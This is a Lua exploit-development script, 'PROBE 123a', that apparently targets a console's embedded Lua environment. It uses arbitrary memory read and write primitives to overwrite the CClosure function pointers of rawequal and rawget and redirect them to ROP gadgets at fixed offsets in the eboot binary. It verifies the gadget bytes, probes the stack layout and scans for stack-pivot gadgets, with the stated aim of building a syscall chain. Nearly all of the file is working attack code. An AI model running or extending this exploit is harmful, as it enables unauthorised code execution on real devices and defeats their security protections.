-- CRASH_CLASS: MODERATE
-- PROBE 123a: Stack layout probe via pop gadgets + mov-write gadgets
--
-- Context: 117a confirmed single-gadget exec via CClosure +0x20 redirect.
-- 122b cataloged gadgets including pop rax;ret, pop rdi;ret, mov [rdi],rax;ret.
-- To CHAIN gadgets into a syscall primitive, we need to know the stack layout
-- at the moment our gadget executes.
--
-- THE KEY QUESTION: When CClosure dispatch does `call [+0x20]`:
--   [rsp+0] = return address (back to dispatch)
--   [rsp+8] = ??? (saved rbp? caller frame? we don't know!)
--
-- If we redirect to `pop rax; ret`:
--   pop rax → rax = return_addr (the value at [rsp])
--   ret → jumps to [rsp+8] (the next stack value)
--
-- Then the behavior (crash vs clean return) tells us what [rsp+8] is.
-- If it returns cleanly, [rsp+8] was ALSO a valid return address.
-- The Lua return value tells us how many values eax says to return.
--
-- PLAN:
--   Section A: pop rax;ret → observe eax via Lua return count
--   Section B: pop rcx;ret → observe if crash or clean (rcx is non-volatile)
--   Section C: mov rax,[rdi];ret → read rdi (lua_State*) value through rax
--   Section D: Write a known marker to GPU heap, redirect mov [rdi],rax;ret
--              with rdi=controlled → write rax to our buffer (captures rax value)
--   Section E: Stack pivot scan — find xchg rsp,rax / mov rsp,rax / leave;ret

print("=== PROBE 123a: STACK LAYOUT PROBE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function eboot_addr(eboot_hi, eboot_lo, offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return uint64(string.format("0x%X%08X", hi, lo)), lo, hi
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)
local select_addr = parse_func_addr(select)

print("[*] eboot base: " .. fmt_addr(eboot_base))
print("[*] rawequal:   " .. fmt_addr(rawequal_addr))
print("[*] rawget:     " .. fmt_addr(rawget_addr))
print("[*] select:     " .. fmt_addr(select_addr))

if not eboot_base or not rawequal_addr then
    print("ABORT: missing addresses")
    return
end

local re_orig = safe_rq(rawequal_addr + 0x20)
local rg_orig = safe_rq(rawget_addr + 0x20)
local re_orig_lo = safe_rd(rawequal_addr + 0x20)
local re_orig_hi = safe_rd(rawequal_addr + 0x24)
local rg_orig_lo = safe_rd(rawget_addr + 0x20)
local rg_orig_hi = safe_rd(rawget_addr + 0x24)

print(string.format("[*] rawequal +0x20 orig: 0x%08X_%08X", re_orig_hi or 0, re_orig_lo or 0))
print(string.format("[*] rawget   +0x20 orig: 0x%08X_%08X", rg_orig_hi or 0, rg_orig_lo or 0))

-- Gadget offsets (from 122b catalog)
local GADGETS = {
    xor_eax_ret   = 0x471,     -- 31 C0 C3
    ret_only      = 0x42,      -- C3
    pop_rax_ret   = 0x992,     -- 58 C3
    pop_rcx_ret   = 0xE64,     -- 59 C3
    pop_rsi_ret   = 0xD77D,    -- 5E C3
    pop_rdi_ret   = 0xC9DFE,   -- 5F C3
    pop_rdx_ret   = 0x3B02D7,  -- 5A C3
    mov_rdi_rax   = 0x92C67,   -- 48 89 07 C3 (mov [rdi],rax;ret)
    mov_rax_prax  = 0x1EEBB,   -- 48 8B 00 C3 (mov rax,[rax];ret)
}

-- Verify key gadgets
print("")
print("[*] Verifying gadgets:")
local function verify_gadget(name, offset, expect_lo_bytes)
    local addr = eboot_addr(eboot_hi, eboot_lo, offset)
    local dw = safe_rd(addr)
    local match = dw and (dw % 65536 == expect_lo_bytes or dw % 16777216 == expect_lo_bytes)
    print(string.format("  %s eboot+0x%X: bytes=0x%08X %s",
        name, offset, dw or 0, match and "OK" or "CHECK"))
    return dw
end

verify_gadget("xor eax,eax;ret", GADGETS.xor_eax_ret, 0xC031)
verify_gadget("pop rax;ret",     GADGETS.pop_rax_ret,  0xC358)
verify_gadget("pop rcx;ret",     GADGETS.pop_rcx_ret,  0xC359)
verify_gadget("pop rdi;ret",     GADGETS.pop_rdi_ret,  0xC35F)
verify_gadget("pop rsi;ret",     GADGETS.pop_rsi_ret,  0xC35E)
verify_gadget("mov [rdi],rax",   GADGETS.mov_rdi_rax,  0x0789)

-- Helper: redirect + call + restore
local function redirect_call(func_addr, orig_lo, orig_hi, gadget_offset, ...)
    local gaddr, glo, ghi = eboot_addr(eboot_hi, eboot_lo, gadget_offset)
    memory.write_dword(func_addr + 0x20, glo)
    memory.write_dword(func_addr + 0x24, ghi)
    local results = {pcall(...)}
    memory.write_dword(func_addr + 0x20, orig_lo)
    memory.write_dword(func_addr + 0x24, orig_hi)
    return unpack(results)
end


-- =============================================
-- SECTION A: xor eax,eax;ret baseline (verify)
-- =============================================
print("")
print("--- SECTION A: Baseline verification ---")

local ok, r1 = redirect_call(rawequal_addr, re_orig_lo, re_orig_hi,
    GADGETS.xor_eax_ret, rawequal, 1, 1)
print(string.format("[A] xor eax,eax;ret: ok=%s r1=%s%s",
    tostring(ok), tostring(r1),
    (ok and r1 == nil) and " *** GADGET CONFIRMED ***" or " FAILED"))

if not (ok and r1 == nil) then
    print("ABORT: gadget exec not working")
    return
end

-- Verify restore
local check = rawequal(1, 1)
print(string.format("[A] restore check: rawequal(1,1)=%s%s",
    tostring(check), check == true and " OK" or " BROKEN"))


-- =============================================
-- SECTION B: pop rax;ret → what's on the stack?
-- =============================================
print("")
print("--- SECTION B: pop rax;ret (eboot+0x992) ---")
print("")
print("[B] Theory: CClosure dispatch does `call [+0x20]`")
print("[B]   pop rax → rax = return_addr (dispatch's next instruction)")
print("[B]   ret → jumps to [rsp+8] (what was below return addr)")
print("[B] If [rsp+8] is valid code, we'll return. eax determines nresults.")
print("[B] If [rsp+8] is garbage, we crash (pcall catches it).")
print("")

print("[B1] MARKER_BEFORE_POP_RAX")
local ok_b, rb1, rb2, rb3, rb4, rb5 = redirect_call(
    rawequal_addr, re_orig_lo, re_orig_hi,
    GADGETS.pop_rax_ret, rawequal, 1, 1)
print("[B1] MARKER_AFTER_POP_RAX")
print(string.format("[B1] ok=%s r1=%s r2=%s r3=%s r4=%s r5=%s",
    tostring(ok_b), tostring(rb1), tostring(rb2),
    tostring(rb3), tostring(rb4), tostring(rb5)))

if ok_b then
    print("[B1] *** pop rax;ret RETURNED CLEANLY ***")
    print("[B1] This means [rsp+8] was a valid return address!")
    print("[B1] eax (= old return addr) determined nresults")
    if rb1 == nil then
        print("[B1] r1=nil → eax (return addr) was large → nresults got truncated to 0 or 1")
    elseif rb1 == false then
        print("[B1] r1=false → might be the bottom of the Lua stack")
    else
        print("[B1] r1 value gives us stack info: " .. type(rb1))
    end
else
    print("[B1] CRASHED: " .. tostring(rb1))
    print("[B1] [rsp+8] was not a valid return address")
    print("[B1] We need a different chain strategy (stack pivot)")
end

-- Restore check
check = rawequal(1, 1)
print(string.format("[B1] restore: rawequal(1,1)=%s", tostring(check)))

-- B2: Same on rawget
print("")
print("[B2] pop rax;ret on rawget:")
local t_test = {}
t_test[1] = "marker"
print("[B2] MARKER_BEFORE")
local ok_b2, rb2_1, rb2_2 = redirect_call(
    rawget_addr, rg_orig_lo, rg_orig_hi,
    GADGETS.pop_rax_ret, rawget, t_test, 1)
print("[B2] MARKER_AFTER")
print(string.format("[B2] ok=%s r1=%s r2=%s",
    tostring(ok_b2), tostring(rb2_1), tostring(rb2_2)))
if ok_b2 then
    print("[B2] *** rawget pop rax;ret ALSO RETURNED ***")
end

-- B3: pop rcx;ret — rcx is caller-saved, so pop+ret should behave similarly
print("")
print("[B3] pop rcx;ret (eboot+0xE64):")
print("[B3] MARKER_BEFORE")
local ok_b3, rb3_1, rb3_2 = redirect_call(
    rawequal_addr, re_orig_lo, re_orig_hi,
    GADGETS.pop_rcx_ret, rawequal, 1, 1)
print("[B3] MARKER_AFTER")
print(string.format("[B3] ok=%s r1=%s r2=%s",
    tostring(ok_b3), tostring(rb3_1), tostring(rb3_2)))
if ok_b3 then
    print("[B3] *** pop rcx;ret CLEAN *** — [rsp+8] is valid for both pop variants")
end


-- =============================================
-- SECTION C: pop rdi;ret → rdi gets return addr,
--            ret goes to [rsp+8]
-- =============================================
print("")
print("--- SECTION C: pop rdi;ret (eboot+0xC9DFE) ---")
print("[C] pop rdi overwrites the lua_State* L pointer!")
print("[C] If dispatch uses rdi after our call returns, it may crash.")
print("")

print("[C1] MARKER_BEFORE_POP_RDI")
local ok_c, rc1, rc2 = redirect_call(
    rawequal_addr, re_orig_lo, re_orig_hi,
    GADGETS.pop_rdi_ret, rawequal, 1, 1)
print("[C1] MARKER_AFTER_POP_RDI")
print(string.format("[C1] ok=%s r1=%s r2=%s",
    tostring(ok_c), tostring(rc1), tostring(rc2)))
if ok_c then
    print("[C1] *** pop rdi;ret CLEAN *** — dispatch doesn't use rdi after call!")
else
    print("[C1] CRASHED: " .. tostring(rc1))
    print("[C1] dispatch uses rdi after call — need to preserve rdi for chains")
end

check = rawequal(1, 1)
print(string.format("[C1] restore: rawequal(1,1)=%s", tostring(check)))


-- =============================================
-- SECTION D: ret-only gadget → what does eax
--            have before our gadget? (residual value)
-- =============================================
print("")
print("--- SECTION D: bare ret (eboot+0x42) ---")
print("[D] Does NOT pop anything. Just returns immediately.")
print("[D] eax = whatever it was before call → Lua reads it as nresults.")
print("[D] nresults tells us what eax's residual value is.")
print("")

print("[D1] MARKER_BEFORE_RET")
local ok_d, rd1, rd2, rd3, rd4, rd5, rd6, rd7, rd8 = redirect_call(
    rawequal_addr, re_orig_lo, re_orig_hi,
    GADGETS.ret_only, rawequal, 1, 1)
print("[D1] MARKER_AFTER_RET")
print(string.format("[D1] ok=%s r1=%s r2=%s r3=%s r4=%s r5=%s r6=%s r7=%s r8=%s",
    tostring(ok_d), tostring(rd1), tostring(rd2), tostring(rd3),
    tostring(rd4), tostring(rd5), tostring(rd6), tostring(rd7), tostring(rd8)))

if ok_d then
    if rd1 == nil then
        print("[D1] eax residual = 0 (no returns)")
    elseif rd1 ~= nil and rd2 == nil then
        print("[D1] eax residual = 1 → one value popped from Lua stack")
        print("[D1] r1 type=" .. type(rd1) .. " val=" .. tostring(rd1))
    else
        local count = 0
        for _, v in ipairs({rd1,rd2,rd3,rd4,rd5,rd6,rd7,rd8}) do
            if v ~= nil then count = count + 1 else break end
        end
        print(string.format("[D1] eax residual = %d → %d values from Lua stack", count, count))
    end
else
    print("[D1] CRASHED: " .. tostring(rd1))
end

check = rawequal(1, 1)
print(string.format("[D1] restore: rawequal(1,1)=%s", tostring(check)))


-- =============================================
-- SECTION E: mov rax,[rax];ret → read through
--            rax (rax = whatever at dispatch time)
-- =============================================
print("")
print("--- SECTION E: mov rax,[rax];ret (eboot+0x1EEBB) ---")
print("[E] If rax holds a valid pointer at call time, this dereferences it.")
print("[E] Result: eax = low 32 bits of *rax → Lua nresults.")
print("[E] RISKY: if rax is not a valid pointer, SIGSEGV crash.")
print("")

print("[E1] MARKER_BEFORE_DEREF")
local ok_e, re1, re2 = redirect_call(
    rawequal_addr, re_orig_lo, re_orig_hi,
    GADGETS.mov_rax_prax, rawequal, 1, 1)
print("[E1] MARKER_AFTER_DEREF")
print(string.format("[E1] ok=%s r1=%s r2=%s",
    tostring(ok_e), tostring(re1), tostring(re2)))
if ok_e then
    print("[E1] *** rax was a valid pointer at call time ***")
    print("[E1] nresults (from *rax) tells us what rax pointed to")
else
    print("[E1] CRASHED: rax was not a valid pointer at call time")
end

check = rawequal(1, 1)
print(string.format("[E1] restore: rawequal(1,1)=%s", tostring(check)))


-- =============================================
-- SECTION F: Scan for stack pivot gadgets
-- =============================================
print("")
print("--- SECTION F: Stack pivot gadget scan ---")
print("[F] Looking for xchg rax,rsp / mov rsp,rax / leave;ret in eboot")
print("")

local function scan_pattern(name, bytes, len, limit)
    limit = limit or 0x500000
    local found = {}
    for off = 0, limit - 8, 4 do
        local addr = eboot_addr(eboot_hi, eboot_lo, off)
        local dw = safe_rd(addr)
        if dw then
            for shift = 0, 3 do
                if shift + len <= 4 then
                    local val = math.floor(dw / (256^shift)) % (256^len)
                    if val == bytes then
                        found[#found + 1] = off + shift
                        if #found >= 5 then return found end
                    end
                end
            end
        end
    end
    return found
end

-- leave;ret = C9 C3
print("[F1] Scanning for leave;ret (C9 C3)...")
local leave_hits = scan_pattern("leave;ret", 0xC3C9, 2, 0x500000)
if #leave_hits > 0 then
    print(string.format("  FOUND %d instances:", #leave_hits))
    for i, off in ipairs(leave_hits) do
        print(string.format("    eboot+0x%X", off))
    end
    print("  *** leave;ret = mov rsp,rbp; pop rbp; ret ***")
    print("  *** If we control rbp, we control rsp → stack pivot! ***")
else
    print("  NOT FOUND in first 5MB")
end

-- xchg rax,rsp = 48 94 (REX.W + XCHG rax,rsp)
-- Actually xchg rsp,rax = 48 94
print("")
print("[F2] Scanning for xchg rax,rsp (48 94)...")
local xchg_hits = scan_pattern("xchg rax,rsp", 0x9448, 2, 0x500000)
if #xchg_hits > 0 then
    print(string.format("  FOUND %d instances:", #xchg_hits))
    for i, off in ipairs(xchg_hits) do
        local a = eboot_addr(eboot_hi, eboot_lo, off)
        local ctx = safe_rd(a)
        print(string.format("    eboot+0x%X bytes=0x%08X", off, ctx or 0))
    end
else
    print("  NOT FOUND")
end

-- push rax; ... ; pop rsp patterns are rare but check
-- mov rsp,rax = 48 89 C4
print("")
print("[F3] Scanning for mov rsp,rax (48 89 C4)...")
local mov_rsp_hits = scan_pattern("mov rsp,rax", 0xC48948, 3, 0x500000)
if #mov_rsp_hits > 0 then
    print(string.format("  FOUND %d instances:", #mov_rsp_hits))
    for i, off in ipairs(mov_rsp_hits) do
        print(string.format("    eboot+0x%X", off))
    end
else
    print("  NOT FOUND")
end

-- mov rsp,rbp = 48 89 EC (another stack pivot if we control rbp)
print("")
print("[F4] Scanning for mov rsp,rbp (48 89 EC)...")
local mov_rsp_rbp = scan_pattern("mov rsp,rbp", 0xEC8948, 3, 0x500000)
if #mov_rsp_rbp > 0 then
    print(string.format("  FOUND %d instances:", #mov_rsp_rbp))
    for i, off in ipairs(mov_rsp_rbp) do
        print(string.format("    eboot+0x%X", off))
    end
else
    print("  NOT FOUND")
end

-- pop rsp;ret = 5C C3
print("")
print("[F5] Scanning for pop rsp;ret (5C C3)...")
local pop_rsp_hits = scan_pattern("pop rsp;ret", 0xC35C, 2, 0x500000)
if #pop_rsp_hits > 0 then
    print(string.format("  FOUND %d instances:", #pop_rsp_hits))
    for i, off in ipairs(pop_rsp_hits) do
        print(string.format("    eboot+0x%X", off))
    end
    print("  *** pop rsp;ret pivots to whatever [rsp] points to ***")
    print("  *** But [rsp] at call time = return addr, not controlled ***")
    print("  *** Unless we chain: write addr to stack first ***")
else
    print("  NOT FOUND")
end


-- =============================================
-- Summary
-- =============================================
print("")
print("=== PROBE 123a SUMMARY ===")
print("")
print("Stack layout results from sections B-E tell us:")
print("  - Whether pop;ret gadgets chain naturally (B survived = yes)")
print("  - Whether rdi clobber matters (C survived = dispatch ignores rdi after)")
print("  - What eax residual is (D → nresults count)")
print("  - Whether rax is a useful pointer (E)")
print("")
print("Stack pivot gadgets from section F tell us:")
print("  - Whether leave;ret exists (pivot via rbp control)")
print("  - Whether xchg/mov rsp gadgets exist")
print("")
print("NEXT: If pop;ret works, the 2-gadget chain is:")
print("  Call 1: redirect to pop rax;ret → pops return addr, rets to [rsp+8]")
print("  If [rsp+8] returns cleanly, we effectively skip one stack frame.")
print("  Combine with mov [rdi],rax;ret to write the return addr somewhere.")
print("")
print("=== PROBE 123a COMPLETE ===")
